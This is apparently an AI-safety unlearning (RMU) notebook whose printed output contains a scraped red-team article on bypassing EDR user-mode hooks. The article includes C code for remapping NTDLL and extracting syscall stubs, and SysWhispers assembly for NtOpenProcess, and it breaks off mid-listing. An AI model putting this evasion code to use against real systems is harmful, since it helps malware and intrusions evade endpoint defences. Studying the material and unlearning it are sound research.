{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# We want a Dataset class that loads in a jsonl file, tokenizes the dataset as expected and returns the input ids and attention mask.\n",
    "import os\n",
    "import json\n",
    "\n",
    "class JsonlDataset():\n",
    "  def __init__(self, tokenizer, tokenizer_max_length, batch_size, min_len, dataset_name, dataset_folder, device):\n",
    "    self.tokenizer = tokenizer\n",
    "    if tokenizer.pad_token is None:\n",
    "      tokenizer.pad_token = tokenizer.eos_token\n",
    "\n",
    "    self.tokenizer_max_length = tokenizer_max_length\n",
    "    self.batch_size = batch_size\n",
    "    self.min_len = min_len\n",
    "    self.dataset_name = dataset_name\n",
    "    self.dataset_folder = dataset_folder\n",
    "    self.data = []\n",
    "    self.device = device\n",
    "\n",
    "  def __getitem__(self, idx):\n",
    "    item = self.data[idx]\n",
    "    input_ids = self.tokenizer(item[\"text\"], return_tensors=\"pt\", padding=True, truncation=True, max_length=self.tokenizer_max_length)\n",
    "    inputs = {key: value.to(self.device) for key, value in input_ids.items()}\n",
    "    return {\"input_ids\": inputs[\"input_ids\"].squeeze(0), \"attention_mask\": inputs[\"attention_mask\"].squeeze(0)}\n",
    "\n",
    "  def _load_dataset(self):\n",
    "    dataset_path = os.path.join(self.dataset_folder, self.dataset_name)\n",
    "    if not os.path.exists(dataset_path):\n",
    "      raise FileNotFoundError(f\"Dataset file not found at {dataset_path}\")\n",
    "    \n",
    "    data_list = []\n",
    "    with open(dataset_path, \"r\") as f:\n",
    "      for line in f:\n",
    "        data = json.loads(line)\n",
    "        if len(data[\"text\"]) > self.min_len:\n",
    "          data_list.append(data)\n",
    "\n",
    "    self.data = data_list\n",
    "    \n",
    "  def __len__(self):\n",
    "    return len(self.data)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "import torch\n",
    "\n",
    "class Model():\n",
    "  def __init__(self, model, tokenizer, device, seed = 42):\n",
    "    print(\"ashwinsreevatsa we got the init\")\n",
    "    self.model = model.to(device)\n",
    "    self.tokenizer = tokenizer\n",
    "    self.device = device\n",
    "    self.seed = seed\n",
    "    torch.manual_seed(seed)\n",
    "    self.activations = {}\n",
    "\n",
    "  def hook_fn(self, module, input, output):\n",
    "    self.activations[\"transformer_block_output\"] = output[0].detach()\n",
    "  \n",
    "  def forward(self, inputs, layer_idx: int, with_grad: bool):\n",
    "    if layer_idx >= len(self.model.transformer.h):\n",
    "      raise ValueError(f\"Layer index {layer_idx} is out of bounds for the model. The model has {len(self.model.transformer.h)} layers.\")\n",
    "    try:\n",
    "      hook = self.model.transformer.h[layer_idx].register_forward_hook(self.hook_fn)\n",
    "      tokenized_inputs = self.tokenizer(inputs, return_tensors=\"pt\").to(self.device)\n",
    "\n",
    "      print(\"ashwinsreevatsa when tokenized inputs is ending\")\n",
    "      print(\"tokenized inputs: \", tokenized_inputs)\n",
    "      # print(\"tokenized inputs **\", **tokenized_inputs)\n",
    "      if with_grad:\n",
    "        _ = self.model(**tokenized_inputs)\n",
    "      else:\n",
    "        with torch.no_grad():\n",
    "          _ = self.model(**tokenized_inputs)\n",
    "      print(\"ashwinsreevatsa when try is ending\")\n",
    "    except Exception as e:\n",
    "      print(\"ashwinsreevatsa exception: \", e)\n",
    "    finally:\n",
    "      hook.remove()\n",
    "    print(self.activations)\n",
    "    return self.activations[\"transformer_block_output\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Begin main.\n",
      "ashwinsreevatsa we got the init\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Token indices sequence length is longer than the specified maximum sequence length for this model (13868 > 1024). Running this sequence through the model will result in indexing errors\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Beginning RMU step...\n",
      "#[1]alternate [2]alternate [3]alternate\n",
      "* [4]Our Services\n",
      "* [5]Knowledge Centre\n",
      "* [6]About\n",
      "* [7]Contact\n",
      "* [8]Our Services\n",
      "+ [9]Adversary Simulation\n",
      "+ [10]Application Security\n",
      "+ [11]Penetration Testing\n",
      "+ [12]Response\n",
      "* [13]Knowledge Centre\n",
      "+ [14]Insights\n",
      "+ [15]Research\n",
      "+ [16]Training\n",
      "* [17]About\n",
      "* [18]Contact\n",
      "(BUTTON)\n",
      "* Adversary\n",
      "Adversary Simulation\n",
      "Our best in class red team can deliver a holistic cyber attack\n",
      "simulation to provide a true evaluation of your organisation’s\n",
      "cyber resilience.\n",
      "* Application Security\n",
      "Application\n",
      "Security\n",
      "Leverage the team behind the industry-leading Web Application and\n",
      "Mobile Hacker’s Handbook series.\n",
      "* Penetration Testing\n",
      "Penetration\n",
      "Testing\n",
      "MDSec’s penetration testing team is trusted by companies from the\n",
      "world’s leading technology firms to global financial institutions.\n",
      "* Response\n",
      "Response\n",
      "Our certified team work with customers at all stages of the\n",
      "Incident Response lifecycle through our range of proactive and\n",
      "reactive services.\n",
      "* [19]\n",
      "Research\n",
      "MDSec’s dedicated research team periodically releases white papers,\n",
      "blog posts, and tooling.\n",
      "* [20]\n",
      "Training\n",
      "MDSec’s training courses are informed by our security consultancy\n",
      "and research functions, ensuring you benefit from the latest and\n",
      "most applicable trends in the field.\n",
      "* [21]\n",
      "Insights\n",
      "View insights from MDSec’s consultancy and research teams.\n",
      "ActiveBreach\n",
      "Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams\n",
      "[22]Home > [23]Knowledge Centre > [24]Insights > Bypassing User-Mode\n",
      "Hooks and Direct Invocation of System Calls for Red Teams\n",
      "Introduction\n",
      "The motivation to bypass user-mode hooks initially began with improving\n",
      "the success rate of [25]process injection. There can be legitimate\n",
      "reasons to perform injection. [26]UI Automation and Active\n",
      "Accessibility will use it to read and write memory of a GUI\n",
      "process. [27]Spy++ uses it to log window messages sent and received\n",
      "between processes. But in most cases, it’s used for one of the\n",
      "following:\n",
      "* Hiding code inside a legitimate process to evade, prolong detection\n",
      "and removal.\n",
      "* Executing code in the context of another user or elevating\n",
      "privileges.\n",
      "* Modifying memory to cheat at online games.\n",
      "And another less cited reason is to prevent all the above completing.\n",
      "Generally, process injection from user-mode (UM) applications needs the\n",
      "following steps.\n",
      "1. Open a target process.\n",
      "2. Allocate new or use existing memory to store code.\n",
      "3. Write code with optional data to target process.\n",
      "4. Execute code via new or existing thread.\n",
      "While it’s relatively simple to implement, the most common problem red\n",
      "teamers, game cheats and malware developers encounter today\n",
      "is kernel-mode (KM) notifications, [28]mini-filter drivers and UM hooks\n",
      "installed by security vendors. UM hooks usually exist for system calls\n",
      "located inside NTDLL, which is about as close to the kernel as a UM\n",
      "process can be. With full access to the kernel, you’d assume security\n",
      "vendors have total control over the system and can block any type of\n",
      "malicious activity quite easily. But as some of you will know already,\n",
      "Windows has a security feature builtin since Vista called PatchGuard\n",
      "(PG) that protects critical areas of the kernel from being modified.\n",
      "Those areas include:\n",
      "* System Service Descriptor Table (SSDT)\n",
      "* Global Descriptor Table (GDT)\n",
      "* Interrupt Descriptor Table (IDT)\n",
      "* System images (ntoskrnl.exe, ndis.sys, hal.dll)\n",
      "* Processor MSRs (syscall)\n",
      "PG (much to the disappointment of security vendors and malware\n",
      "developers) restricts any software making extensions to the Windows\n",
      "kernel (even those for legitimate reasons). And up until its\n",
      "introduction, it was commonplace for security vendors to patch the\n",
      "SSDT. (something also used by early versions\n",
      "of [29]RegMon by [30]Sysinternals). Microsoft’s position is\n",
      "that any software, whether malicious or not, that patches the kernel\n",
      "can lead to reliability, performance and, most importantly, security\n",
      "issues. Following the release of PG, security vendors had to completely\n",
      "redesign their anti-malware solutions. Circumventing PG is an option,\n",
      "but it’s not a safe, longterm solution for software intended to protect\n",
      "your operating system.\n",
      "In this post we will catalogue the most popular and effective\n",
      "techniques for bypassing user-mode hooks, outlining advantages and\n",
      "disadvantages of each approach for red teamers where relevant. Finally,\n",
      "we will conclude with some approaches that can be used by defenders to\n",
      "protect or detect these techniques.\n",
      "Kernel-Mode Notifications\n",
      "Before exploring UM hook bypass methods, it’s worth noting that as an\n",
      "alternative to patching or hooking in the kernel, Windows facilitates\n",
      "receiving notifications about events useful in detecting malware. The\n",
      "more common events include creation, termination of a process or thread\n",
      "and the mapping of an image/DLL for execution.\n",
      "Microsoft recommends security vendors use [31]mini-filter drivers to\n",
      "intercept, examine and optionally block I/O events. A significant\n",
      "amount of file system and network functionality is implemented via\n",
      "the [32]NtDeviceIoControlFile system call.\n",
      "Bypass Methods\n",
      "Since Microsoft doesn’t provide a legitimate way for kernel components\n",
      "to receive notifications about memory operations, this forces vendors\n",
      "to install UM hooks in each process. In response to this, various\n",
      "techniques to bypass them have been devised and what follows is a brief\n",
      "description and source code in C to demonstrate some of those methods\n",
      "currently being used.\n",
      "1. Export Address Table (EAT)\n",
      "It’s common for malware to resolve the address of system calls using a\n",
      "combination of [33]GetModuleHandle and [34]GetProcAddress. Another way\n",
      "is to manually locate NTDLL.dll in the Process Environment Block (PEB)\n",
      "and find the system call through parsing the Export Address Table\n",
      "(EAT). The following code is what you might see used to parse the EAT.\n",
      "static\n",
      "LPVOID\n",
      "WINAPI\n",
      "GetProcAddressFromEAT(\n",
      "LPVOID DllBase,\n",
      "const char *FunctionName)\n",
      "{\n",
      "PIMAGE_DOS_HEADER       DosHeader;\n",
      "PIMAGE_NT_HEADERS       NtHeaders;\n",
      "DWORD                   NumberOfNames, VirtualAddress;\n",
      "PIMAGE_DATA_DIRECTORY   DataDirectory;\n",
      "PIMAGE_EXPORT_DIRECTORY ExportDirectory;\n",
      "PDWORD                  Functions;\n",
      "PDWORD                  Names;\n",
      "PWORD                   Ordinals;\n",
      "PCHAR                   Name;\n",
      "LPVOID                  ProcAddress=NULL;\n",
      "DosHeader      = (PIMAGE_DOS_HEADER)DllBase;\n",
      "NtHeaders      = RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);\n",
      "DataDirectory  = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirect\n",
      "ory;\n",
      "VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\n",
      "if (VirtualAddress==0) return NULL;\n",
      "ExportDirectory = RVA2VA(PIMAGE_EXPORT_DIRECTORY, DllBase, VirtualAddress);\n",
      "NumberOfNames   = ExportDirectory->NumberOfNames;\n",
      "if (NumberOfNames==0) return NULL;\n",
      "Functions = RVA2VA(PDWORD,DllBase, ExportDirectory->AddressOfFunctions);\n",
      "Names     = RVA2VA(PDWORD,DllBase, ExportDirectory->AddressOfNames);\n",
      "Ordinals  = RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);\n",
      "do {\n",
      "Name = RVA2VA(PCHAR, DllBase, Names[NumberOfNames-1]);\n",
      "if(lstrcmpA(Name, FunctionName) == 0) {\n",
      "ProcAddress = RVA2VA(LPVOID, DllBase, Functions[Ordinals[NumberOfNames-1\n",
      "]]);\n",
      "return ProcAddress;\n",
      "}\n",
      "} while (--NumberOfNames && ProcAddress == NULL);\n",
      "return ProcAddress;\n",
      "}\n",
      "If using the base address of NTDLL already in memory, this won’t bypass\n",
      "any UM hooks for system calls. It’s fine if you wish to bypass KERNEL32\n",
      "or KERNELBASE hooks, but you can just as well use GetProcAddress to\n",
      "make life easier.\n",
      "Usually, offsec tools will attempt to unhook system calls after calling\n",
      "a function like this and it can work well against many security\n",
      "products. Lately, however, more reputable vendors are either blocking\n",
      "the attempt to unhook or simply restoring the hooks shortly after\n",
      "unhooking has occurred. A hook on NtProtectVirtualMemory could easily\n",
      "intercept attempts to overwrite hooks.\n",
      "2. Dual-load 1 (Section)\n",
      "KnownDlls is a directory in the object namespace that contains section\n",
      "objects for the most common DLLs loaded by a process. It’s intended to\n",
      "improve performance by reducing the load time for an executable and\n",
      "it’s possible to map a new copy of NTDLL into a process by opening the\n",
      "section name “\\KnownDlls\\ntdll.dll“. Once the section object is mapped,\n",
      "we can resolve the address of system calls as described in the previous\n",
      "method. There’s a kernel notification for loading an image and if an\n",
      "EDR or AV spotted NTDLL.dll being loaded a second time, it’s probably\n",
      "going to examine the process for malware or at the very least notify\n",
      "the user of suspicious activity.\n",
      "While you can use [35]NtOpenSection and [36]NtMapViewOfSection to load\n",
      "a new copy, the other problem is that these are likely to be hooked\n",
      "already. Some products won’t hook [37]NtMapViewOfSectionEx, but that’s\n",
      "only available since Windows 10 1803 and it still doesn’t prevent a\n",
      "kernel notification for the mapping.\n",
      "NTSTATUS          Status;\n",
      "LARGE_INTEGER     SectionOffset;\n",
      "SIZE_T            ViewSize;\n",
      "PVOID             ViewBase;\n",
      "HANDLE            SectionHandle;\n",
      "OBJECT_ATTRIBUTES ObjectAttributes;\n",
      "UNICODE_STRING    KnownDllsNtDllName;\n",
      "FARPROC           Function;\n",
      "INIT_UNICODE_STRING(\n",
      "KnownDllsNtDllName,\n",
      "L\"\\\\KnownDlls\\\\ntdll.dll\"\n",
      ");\n",
      "InitializeObjectAttributes(\n",
      "&ObjectAttributes,\n",
      "&KnownDllsNtDllName,\n",
      "OBJ_CASE_INSENSITIVE,\n",
      "0,\n",
      "NULL\n",
      ");\n",
      "Status = NtOpenSection(\n",
      "&SectionHandle,\n",
      "SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_QUERY,\n",
      "&ObjectAttributes\n",
      ");\n",
      "if(!NT_SUCCESS(Status)) {\n",
      "SET_LAST_NT_ERROR(Status);\n",
      "printf(\"Unable to open section %ld\\n\", GetLastError());\n",
      "goto cleanup;\n",
      "}\n",
      "//\n",
      "// Set the offset to start mapping from.\n",
      "//\n",
      "SectionOffset.LowPart = 0;\n",
      "SectionOffset.HighPart = 0;\n",
      "//\n",
      "// Set the desired base address and number of bytes to map.\n",
      "//\n",
      "ViewSize = 0;\n",
      "ViewBase = NULL;\n",
      "Status = NtMapViewOfSection(\n",
      "SectionHandle,\n",
      "NtCurrentProcess(),\n",
      "&ViewBase,\n",
      "0,              // ZeroBits\n",
      "0,              // CommitSize\n",
      "&SectionOffset,\n",
      "&ViewSize,\n",
      "ViewShare,\n",
      "0,\n",
      "PAGE_EXECUTE_READ\n",
      ");\n",
      "if(!NT_SUCCESS(Status)) {\n",
      "SET_LAST_NT_ERROR(Status);\n",
      "printf(\"Unable to map section %ld\\n\", GetLastError());\n",
      "goto cleanup;\n",
      "}\n",
      "Function = (FARPROC)GetProcAddressFromEAT(ViewBase, \"NtOpenProcess\");\n",
      "printf(\"NtOpenProcess : %p, %ld\\n\", Function, GetLastError());\n",
      "cleanup:\n",
      "if(ViewBase != NULL) {\n",
      "NtUnmapViewOfSection(\n",
      "NtCurrentProcess(),\n",
      "ViewBase\n",
      ");\n",
      "}\n",
      "if(SectionHandle != NULL) {\n",
      "NtClose(SectionHandle);\n",
      "}\n",
      "3. Dual-load 2 (Disk)\n",
      "The only additional step when compared to the previous method is that\n",
      "we open a file handle to C:\\Windows\\System32\\NTDLL.dll and use it to\n",
      "create a new section object with the SEC_IMAGE page protection. Then we\n",
      "map the object for reading or\n",
      "executing. [38]NtOpenFile, [39]NtCreateFile can be hooked, but even if\n",
      "they aren’t, this doesn’t solve the problems highlighted in the\n",
      "previous method.\n",
      "NTSTATUS          Status;\n",
      "LARGE_INTEGER     SectionOffset;\n",
      "SIZE_T            ViewSize;\n",
      "PVOID             ViewBase=NULL;\n",
      "HANDLE            FileHandle=NULL, SectionHandle=NULL;\n",
      "OBJECT_ATTRIBUTES ObjectAttributes;\n",
      "IO_STATUS_BLOCK   StatusBlock;\n",
      "UNICODE_STRING    FileName;\n",
      "FARPROC           Function;\n",
      "//\n",
      "// Try open ntdll.dll on disk for reading.\n",
      "//\n",
      "INIT_UNICODE_STRING(\n",
      "FileName,\n",
      "L\"\\\\??\\\\C:\\\\Windows\\\\System32\\\\ntdll.dll\"\n",
      ");\n",
      "InitializeObjectAttributes(\n",
      "&ObjectAttributes,\n",
      "&FileName,\n",
      "OBJ_CASE_INSENSITIVE,\n",
      "0,\n",
      "NULL\n",
      ");\n",
      "Status = NtOpenFile(\n",
      "&FileHandle,\n",
      "FILE_READ_DATA,\n",
      "&ObjectAttributes,\n",
      "&StatusBlock,\n",
      "FILE_SHARE_READ,\n",
      "NULL\n",
      ");\n",
      "if(!NT_SUCCESS(Status)) {\n",
      "SET_LAST_NT_ERROR(Status);\n",
      "printf(\"NtOpenFile failed %ld\\n\", GetLastError());\n",
      "goto cleanup;\n",
      "}\n",
      "//\n",
      "// Create section\n",
      "//\n",
      "Status = NtCreateSection(\n",
      "&SectionHandle,\n",
      "SECTION_ALL_ACCESS,\n",
      "NULL,\n",
      "NULL,\n",
      "PAGE_READONLY,\n",
      "SEC_IMAGE,\n",
      "FileHandle\n",
      ");\n",
      "if(!NT_SUCCESS(Status)) {\n",
      "SET_LAST_NT_ERROR(Status);\n",
      "printf(\"NtCreateSection failed %ld\\n\", GetLastError());\n",
      "goto cleanup;\n",
      "}\n",
      "//\n",
      "// Set the offset to start mapping from.\n",
      "//\n",
      "SectionOffset.LowPart = 0;\n",
      "SectionOffset.HighPart = 0;\n",
      "//\n",
      "// Set the desired base address and number of bytes to map.\n",
      "//\n",
      "ViewSize = 0;\n",
      "ViewBase = NULL;\n",
      "Status = NtMapViewOfSection(\n",
      "SectionHandle,\n",
      "NtCurrentProcess(),\n",
      "&ViewBase,\n",
      "0,              // ZeroBits\n",
      "0,              // CommitSize\n",
      "&SectionOffset,\n",
      "&ViewSize,\n",
      "ViewShare,\n",
      "0,\n",
      "PAGE_EXECUTE_READ\n",
      ");\n",
      "if(!NT_SUCCESS(Status)) {\n",
      "SET_LAST_NT_ERROR(Status);\n",
      "printf(\"Unable to map section %ld\\n\", GetLastError());\n",
      "goto cleanup;\n",
      "}\n",
      "Function = (FARPROC)GetProcAddressFromEAT(ViewBase, \"NtOpenProcess\");\n",
      "printf(\"NtOpenProcess : %p, %ld\\n\", Function, GetLastError());\n",
      "cleanup:\n",
      "if(ViewBase != NULL) {\n",
      "NtUnmapViewOfSection(\n",
      "NtCurrentProcess(),\n",
      "ViewBase\n",
      ");\n",
      "}\n",
      "if(SectionHandle != NULL) {\n",
      "NtClose(SectionHandle);\n",
      "}\n",
      "if(FileHandle != NULL) {\n",
      "NtClose(FileHandle);\n",
      "}\n",
      "4. Extracting SSN Code Stub (Disk)\n",
      "Open a file handle to C:\\Windows\\System32\\NTDLL.dll. Create and map a\n",
      "section object with SEC_COMMIT and PAGE_READONLY page protection. (to\n",
      "try bypass any hooks and notifications). The system call that attacker\n",
      "needs is then resolved by parsing of the PE header and copying the call\n",
      "stub to executable memory. One could also use it to overwrite any\n",
      "potential hooks in the existing copy of NTDLL, but that will require\n",
      "using NtProtectVirtualMemory, which may already be hooked. Most system\n",
      "calls are usually no more than 32 bytes, but if the length of stub is\n",
      "required, 64-bit PE files support an exception directory which can be\n",
      "used to calculate it. NtOpenFile, NtCreateFile, [40]NtReadFile might be\n",
      "hooked and reading NTDLL.dll from disk will look suspicious.\n",
      "static\n",
      "DWORD\n",
      "WINAPI\n",
      "RvaToOffset(\n",
      "PIMAGE_NT_HEADERS NtHeaders,\n",
      "DWORD Rva)\n",
      "{\n",
      "PIMAGE_SECTION_HEADER SectionHeader;\n",
      "DWORD                 i, Size;\n",
      "if(Rva == 0) return 0;\n",
      "SectionHeader = IMAGE_FIRST_SECTION(NtHeaders);\n",
      "for(i = 0; i<NUMBER_OF_SECTIONS(NtHeaders); i++) {\n",
      "Size = SectionHeader[i].Misc.VirtualSize ?\n",
      "SectionHeader[i].Misc.VirtualSize : SectionHeader[i].SizeOfRawData;\n",
      "if(SectionHeader[i].VirtualAddress <= Rva &&\n",
      "Rva <= (DWORD)SectionHeader[i].VirtualAddress + SectionHeader[i].SizeOfR\n",
      "awData)\n",
      "{\n",
      "if(Rva >= SectionHeader[i].VirtualAddress &&\n",
      "Rva <  SectionHeader[i].VirtualAddress + Size) {\n",
      "return SectionHeader[i].PointerToRawData + (Rva - SectionHeader[i].Vir\n",
      "tualAddress);\n",
      "}\n",
      "}\n",
      "}\n",
      "return 0;\n",
      "}\n",
      "static\n",
      "PVOID\n",
      "WINAPI\n",
      "GetProcAddressFromMappedDLL(\n",
      "PVOID DllBase,\n",
      "const char *FunctionName)\n",
      "{\n",
      "PIMAGE_DOS_HEADER       DosHeader;\n",
      "PIMAGE_NT_HEADERS       NtHeaders;\n",
      "PIMAGE_SECTION_HEADER   SectionHeader;\n",
      "PIMAGE_DATA_DIRECTORY   DataDirectory;\n",
      "PIMAGE_EXPORT_DIRECTORY ExportDirectory;\n",
      "DWORD                   Rva, Offset, NumberOfNames;\n",
      "PCHAR                   Name;\n",
      "PDWORD                  Functions, Names;\n",
      "PWORD                   Ordinals;\n",
      "DosHeader = (PIMAGE_DOS_HEADER)DllBase;\n",
      "NtHeaders  = (PIMAGE_NT_HEADERS)((PBYTE)DllBase + DosHeader->e_lfanew);\n",
      "DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirecto\n",
      "ry;\n",
      "Rva = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\n",
      "Offset = RvaToOffset(NtHeaders, Rva);\n",
      "ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)DllBase + Offset);\n",
      "NumberOfNames = ExportDirectory->NumberOfNames;\n",
      "Offset = RvaToOffset(NtHeaders, ExportDirectory->AddressOfNames);\n",
      "Names = (PDWORD)((PBYTE)DllBase + Offset);\n",
      "Offset = RvaToOffset(NtHeaders, ExportDirectory->AddressOfFunctions);\n",
      "Functions = (PDWORD)((PBYTE)DllBase + Offset);\n",
      "Offset = RvaToOffset(NtHeaders, ExportDirectory->AddressOfNameOrdinals);\n",
      "Ordinals = (PWORD)((PBYTE)DllBase + Offset);\n",
      "do {\n",
      "Name = (PCHAR)(RvaToOffset(NtHeaders, Names[NumberOfNames - 1]) + (PBYTE)D\n",
      "llBase);\n",
      "if(lstrcmpA(Name, FunctionName) == 0) {\n",
      "return (PVOID)((PBYTE)DllBase + RvaToOffset(NtHeaders, Functions[Ordinal\n",
      "s[NumberOfNames - 1]]));\n",
      "}\n",
      "} while (--NumberOfNames);\n",
      "return NULL;\n",
      "}\n",
      "5. Extracting SSN (Disk)\n",
      "It’s the exact same as the previous method described, except we only\n",
      "extract the System Service Number (SSN) and manually execute it with a\n",
      "code stub of our own. [41]SyscallTables demonstrates dumping the\n",
      "numbers, while [42]Hell’s Gate demonstrates using them.\n",
      "6. FireWalker\n",
      "[43]FireWalker: A New Approach to Generically Bypass User-Space EDR\n",
      "Hooking works by installing a Vectored Exception Handler and setting\n",
      "the CPU trap flag to single-step through a Win32 API or system call.\n",
      "The exception handler then attempts to locate the original system call\n",
      "stub. Another approach to this is using a disassembler and separate\n",
      "routines to build a call graph of the system call. Windows has a\n",
      "builtin disassembler that can be used to calculate the length of an\n",
      "instruction. The downside is that it doesn’t provide a binary view of\n",
      "an opcode, so the [44]Zydis disassembler library may be a better\n",
      "option. Internally, the debugger engine for windows has support for\n",
      "building a call graph of a function (to support the uf command in\n",
      "WinDbg), but unfortunately there’s no API exposed to developers.\n",
      "7. SysWhispers\n",
      "[45]SysWhispers contains a Python script that will construct a code\n",
      "stub for system calls to run on AMD64/x64 systems. The stub is\n",
      "compatible with Windows between XP/2003 and 10/2019. The generator uses\n",
      "SSNs taken from [46]a list maintained by [47]j00ru. And the correct SSN\n",
      "is selected at runtime based on the version of the operating system\n",
      "that’s detected via the PEB. In more recent versions of Windows,\n",
      "there’s also the option of using [48]KUSER_SHARED_DATA to read\n",
      "the [49]major, minor and build version. SysWhispers is currently\n",
      "popular among red teamers for bypassing AV and EDR. The following is an\n",
      "example code stub generated for NtOpenProcess:\n",
      "NtOpenProcess:\n",
      "mov rax, [gs:60h]                       ; Load PEB into RAX.\n",
      "NtOpenProcess_Check_X_X_XXXX:               ; Check major version.\n",
      "cmp dword [rax+118h], 5\n",
      "je  NtOpenProcess_SystemCall_5_X_XXXX\n",
      "cmp dword [rax+118h], 6\n",
      "je  NtOpenProcess_Check_6_X_XXXX\n",
      "cmp dword [rax+118h], 10\n",
      "je  NtOpenProcess_Check_10_0_XXXX\n",
      "jmp NtOpenProcess_SystemCall_Unknown\n",
      "NtOpenProcess_Check_6_X_XXXX:               ; Check minor version for Windows Vi\n",
      "sta/7/8.\n",
      "cmp dword [rax+11ch], 0\n",
      "je  NtOpenProcess_Check_6_0_XXXX\n",
      "cmp dword [rax+11ch], 1\n",
      "je  NtOpenProcess_Check_6_1_XXXX\n",
      "cmp dword [rax+11ch], 2\n",
      "je  NtOpenProcess_SystemCall_6_2_XXXX\n",
      "cmp dword [rax+11ch], 3\n",
      "je  NtOpenProcess_SystemCall_6_3_XXXX\n",
      "jmp NtOpenProcess_SystemCall_Unknown\n",
      "NtOpenProcess_Check_6_0_XXXX:               ; Check build number for Windows Vis\n",
      "ta.\n",
      "cmp word [rax+120h], 6000\n",
      "je  NtOpenProcess_SystemCall_6_0_6000\n",
      "cmp word [rax+120h], 6001\n",
      "je  NtOpenProcess_SystemCall_6_0_6001\n",
      "cmp word [rax+120h], 6002\n",
      "je  NtOpenProcess_SystemCall_6_0_6002\n",
      "jmp NtOpenProcess_SystemCall_Unknown\n",
      "NtOpenProcess_Check_6_1_XXXX:               ; Check build number for Windows 7.\n",
      "cmp word [rax+120h], 7600\n",
      "je  NtOpenProcess_SystemCall_6_1_7600\n",
      "cmp word [rax+120h], 7601\n",
      "je  NtOpenProcess_SystemCall_6_1_7601\n",
      "jmp NtOpenProcess_SystemCall_Unknown\n",
      "NtOpenProcess_Check_10_0_XXXX:              ; Check build number for Windows 10.\n",
      "cmp word [rax+120h], 10240\n",
      "je  NtOpenProcess_SystemCall_10_0_10240\n",
      "cmp word [rax+120h], 10586\n",
      "je  NtOpenProcess_SystemCall_10_0_10586\n",
      "cmp word [rax+120h], 14393\n",
      "je  NtOpenProcess_SystemCall_10_0_14393\n",
      "cmp word [rax+120h], 15063\n",
      "je  NtOpenProcess_SystemCall_10_0_15063\n",
      "cmp word [rax+120h], 16299\n",
      "je  NtOpenProcess_SystemCall_10_0_16299\n",
      "cmp word [rax+120h], 17134\n",
      "je  NtOpenProcess_SystemCall_10_0_17134\n",
      "cmp word [rax+120h], 17763\n",
      "je  NtOpenProcess_SystemCall_10_0_17763\n",
      "cmp word [rax+120h], 18362\n",
      "je  NtOpenProcess_SystemCall_10_0_18362\n",
      "cmp word [rax+120h], 18363\n",
      "je  NtOpenProcess_SystemCall_10_0_18363\n",
      "cmp word [rax+120h], 19041\n",
      "je  NtOpenProcess_SystemCall_10_0_19041\n",
      "jmp NtOpenProcess_SystemCall_Unknown\n",
      "NtOpenProcess_SystemCall_5_X_XXXX:          ; Windows XP and Server 2003\n",
      "mov eax, 0023h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_6_0_6000:          ; Windows Vista SP0\n",
      "mov eax, 0023h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_6_0_6001:          ; Windows Vista SP1 and Server 2008\n",
      "SP0\n",
      "mov eax, 0023h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_6_0_6002:          ; Windows Vista SP2 and Server 2008\n",
      "SP2\n",
      "mov eax, 0023h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_6_1_7600:          ; Windows 7 SP0\n",
      "mov eax, 0023h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_6_1_7601:          ; Windows 7 SP1 and Server 2008 R2 S\n",
      "P0\n",
      "mov eax, 0023h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_6_2_XXXX:          ; Windows 8 and Server 2012\n",
      "mov eax, 0024h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_6_3_XXXX:          ; Windows 8.1 and Server 2012 R2\n",
      "mov eax, 0025h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_10_0_10240:        ; Windows 10.0.10240 (1507)\n",
      "mov eax, 0026h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_10_0_10586:        ; Windows 10.0.10586 (1511)\n",
      "mov eax, 0026h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_10_0_14393:        ; Windows 10.0.14393 (1607)\n",
      "mov eax, 0026h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_10_0_15063:        ; Windows 10.0.15063 (1703)\n",
      "mov eax, 0026h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_10_0_16299:        ; Windows 10.0.16299 (1709)\n",
      "mov eax, 0026h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_10_0_17134:        ; Windows 10.0.17134 (1803)\n",
      "mov eax, 0026h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_10_0_17763:        ; Windows 10.0.17763 (1809)\n",
      "mov eax, 0026h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_10_0_18362:        ; Windows 10.0.18362 (1903)\n",
      "mov eax, 0026h\n",
      "jmp NtOpenProcess_Epilogue\n",
